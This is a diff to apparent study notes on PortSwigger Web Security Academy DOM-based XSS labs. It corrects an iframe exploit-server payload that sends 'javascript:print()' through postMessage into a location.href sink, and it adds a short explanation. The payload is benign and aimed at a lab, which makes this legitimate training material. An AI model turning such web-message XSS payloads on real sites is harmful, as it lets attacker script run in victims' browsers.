@@ -2750,7 +2750,7 @@ https://portswigger.net/web-security/dom-based
                         }, false);
     ```
   - Exploit server
-    `iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
+    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
   - When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
 - DOM XSS using web messages and **JSON.parse**
   -  Discover > home page > Find script > addEventListener() > This event listener expects a string that is parsed using JSON.parse()
